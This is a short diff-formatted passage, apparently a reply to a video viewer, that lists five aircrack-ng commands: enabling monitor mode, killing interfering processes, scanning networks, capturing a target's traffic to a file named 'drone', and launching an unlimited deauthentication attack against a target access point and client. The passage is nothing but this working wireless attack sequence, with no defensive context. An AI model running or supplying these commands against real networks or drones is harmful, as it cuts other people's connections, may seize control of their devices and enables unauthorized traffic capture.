@@ -1,0 +1,6 @@
+It’s not clear why you cannot opening the video in fullscreen, however these are the full codes:
+1.- airmon-ng start [wireless interface]
+2.- airmon-ng check kill
+3.- airodump-ng [wireless interface in monitor mode]
+4.- airodump-ng -c [channel] –bssid [target bssid MAC address] -w /root/drone [wireless interface in monitor mode]
+5.- aireplay-ng -0 0 -a [target bssid MAC address] -c [target access point MAC address] [wireless interface in monitor mode]
